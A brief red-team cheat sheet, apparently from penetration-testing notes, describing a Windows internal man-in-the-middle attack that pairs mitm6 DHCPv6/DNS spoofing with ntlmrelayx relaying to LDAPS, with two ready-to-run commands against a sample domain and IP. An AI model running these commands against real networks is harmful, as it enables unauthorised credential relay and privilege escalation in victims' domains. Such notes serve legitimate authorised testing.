# REDTEAM
## INTERNAL WINDOWS
### --> MITM ATTACKS
#### 1. *Mitm6 + NTLM RELAY*
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**Description:** The attack enables to forge fake DNS Server, by replaying to DHCPv6 requests in internal network. The tool can be combined with ntlmrelay to further escalate privileges.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br/><br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**Repositry:** https://github.com/fox-it/mitm6<br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</br>

Description | Commands
------------ | -------------
*First set up ntlmrelay* | `ntlmrelayx.py -6 -t ldaps://10.0.10.26 -wh fake.cyberlabs.kz -l loot`
*Start mitm6 on the same network that hosts in* | `mitm6.py -d cyberlabs.kz`
